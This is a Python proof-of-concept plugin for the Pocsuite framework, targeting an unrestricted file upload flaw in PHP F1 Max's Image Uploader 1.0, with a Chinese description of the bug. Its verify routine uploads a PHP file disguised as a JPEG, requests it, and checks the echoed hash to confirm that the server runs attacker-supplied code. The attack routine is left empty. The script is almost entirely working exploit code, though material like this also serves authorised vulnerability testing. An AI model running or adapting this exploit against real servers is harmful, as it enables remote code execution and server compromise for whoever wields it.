#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import urlparse

class TestPOC(POCBase):
    vulID = '67514'  # ssvid
    version = '1.0'
    author = ['hfloveyy']
    vulDate = '2010-01-26'
    createDate = '2015-12-08'
    updateDate = '2015-12-08'
    references = ['http://www.sebug.net/vuldb/ssvid-67514']
    name = 'Max&#39;s Image Uploader Shell Upload Vulnerability'
    appPowerLink = 'http://www.phpf1.com'
    appName = 'PHP F1 Max&#39;s Image Uploader'
    appVersion = '1.0'
    vulType = 'File upload vulnerability'
    desc = '''
    PHP F1 Max's Image Uploader 1.0版本的maxImageUpload/index.php中存在无限制文件上传漏洞。
当Apache未被设置来处理具有pjpeg或jpeg扩展名的拟态文件时，远程攻击者可以通过上传具有一个pjpeg或jpeg扩展名的文件，执行任意代码，并借助对original/的一个直接请求来访问该文件。 
    '''
    samples = ['127.0.0.1']

    def _attack(self):
        result = {}
        #Write your code here

        return self.parse_output(result)

    def _verify(self):
        result = {}
        testurl = urlparse.urljoin(self.url, '/maxImageUpload/original/1.php')
        vulurl = urlparse.urljoin(self.url, '/maxImageUpload/index.php')

        payload = {'myfile':('1.php','<?php echo md5(0x2333333);unlink(__FILE__);?>','image/jpeg')}
        data = {'submitBtn':'Upload'}



        
        req.post(vulurl,files = payload,data = data).content
        resp = req.get(testurl)
        if '5a8adb32edd60e0cfb459cfb38093755' in resp:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vulurl
            result['VerifyInfo']['Payload'] = payload
        #Write your code here

        return self.parse_output(result)

    def parse_output(self, result):


        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)